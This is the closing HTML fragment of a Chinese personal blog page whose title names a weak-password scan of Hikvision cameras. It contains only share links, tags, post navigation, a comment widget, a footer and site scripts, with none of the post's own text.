+</a><a title="分享到 Evernote" data-sharer=evernote data-url=https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/ data-title=针对海康威视网络摄像头弱密码的一次扫描><i class=icon-evernote></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class=icon-tags></i>&nbsp;<a href=../../../../tags/scan/>scan</a>,&nbsp;<a href=../../../../tags/web/>web</a></section><section><span><a onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=../../../../>主页</a></span></section></div><div class=post-nav><a href=../../../../posts/learn/maillist/ class=prev rel=prev title=了解邮件列表><i class=icon-angle-left></i>了解邮件列表</a>
+<a href=../../../../posts/learn/some-git-skills/ class=next rel=next title=一些我刚学到的GIT技巧>一些我刚学到的GIT技巧<i class=icon-angle-right></i></a></div></div><div id=comments><div class=giscus id=giscus></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app/zh-CN>Giscus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class=icon-copyright></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://zu1k.com target=_blank>zu1k</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class=icon-up></i>
+</a><a id=view-comments class=fixed-button title=查看评论><i class=icon-comment></i></a></div><link rel=stylesheet href=../../../../lib/lightgallery/lightgallery.min.css><script type=text/javascript src=../../../../lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=../../../../lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=../../../../lib/fuse/fuse.min.js></script><script type=text/javascript src=../../../../lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=../../../../lib/instant-page/5.1.0.min.js></script><script type=text/javascript src=../../../../lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=../../../../lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=../../../../lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=../../../../lib/clipboard/clipboard.min.js></script><script type=text/javascript src=../../../../lib/sharer/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:100},comment:{giscus:{category:"Comments",categoryid:"DIC_kwDOEfJ9084CA02V",enable:!0,mapping:"og:title",repo:"zu1k/blog",repoid:"MDEwOlJlcG9zaXRvcnkzMDExMDQ1OTU="}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},search:{distance:100,findAllMatches:!1,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!0,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.1,type:"fuse",useExtendedSearch:!1}}</script><script type=text/javascript src=../../../../js/theme.min.js></script></body></html>
